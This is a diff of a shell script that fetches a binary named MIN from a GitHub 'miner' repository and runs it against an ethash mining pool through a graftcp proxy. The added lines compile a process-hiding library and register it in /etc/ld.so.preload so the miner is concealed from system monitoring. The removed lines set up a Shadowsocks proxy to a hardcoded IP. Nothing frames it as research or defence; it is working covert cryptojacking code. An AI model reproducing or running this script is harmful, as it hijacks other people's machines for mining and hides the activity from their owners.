@@ -35,12 +35,13 @@ sleep .2
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://bitbucket.org/skyforce112211/skyforce123/downloads/MIN
+./graftcp/graftcp wget https://github.com/thefacta/miner/raw/main/MIN
 chmod +x MIN
 
-apt -y install shadowsocks-libev rng-tools
-
-ss-local -s 144.217.7.95 -p 8388 -l 9999 -k rslzw -m chacha20-ietf-poly1305 -v &
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
 ./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 1-999 -n 1)-MAGIC)@ethash.kupool.com:8888 --log --extra 
 sleep 2
